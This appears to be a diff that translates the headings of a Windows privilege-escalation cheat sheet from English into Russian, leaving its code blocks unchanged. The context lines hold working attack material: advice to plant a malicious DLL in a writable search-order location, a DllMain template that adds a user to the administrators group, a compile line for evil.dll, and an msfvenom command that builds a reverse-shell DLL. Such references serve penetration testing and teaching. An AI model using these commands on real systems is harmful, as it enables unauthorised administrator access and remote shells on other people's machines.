@@ -171,7 +171,7 @@ accesschk.exe -uvwck HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
 # If writable → modify ImagePath registry key
 ```
 
-Windows DLL search order — place malicious DLL at highest-priority writable location
+Порядок поиска DLL в Windows — размещение вредоносной DLL в доступном на запись расположении с наивысшим приоритетом.
 
 ```
 # Windows DLL search order:
@@ -184,7 +184,7 @@ Windows DLL search order — place malicious DLL at highest-priority writable lo
 # Find missing DLLs with Procmon (filter: NAME NOT FOUND + .dll)
 ```
 
-DLL template that adds user to administrators group on load
+Шаблон DLL, который при загрузке добавляет пользователя в группу администраторов.
 
 ```
 # Malicious DLL template (C):
@@ -199,14 +199,14 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
 # Compile: x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
 ```
 
-Generate reverse shell DLL payload with msfvenom
+Генерация DLL-полезной нагрузки с обратной оболочкой (reverse shell) с помощью msfvenom.
 
 ```
 # Using msfvenom:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o evil.dll
 ```
 
-Find writable directories in PATH for DLL planting
+**Поиск доступных на запись каталогов в переменной PATH для подмены DLL (DLL planting).
 
 ```
 # Check PATH directories for writable locations:
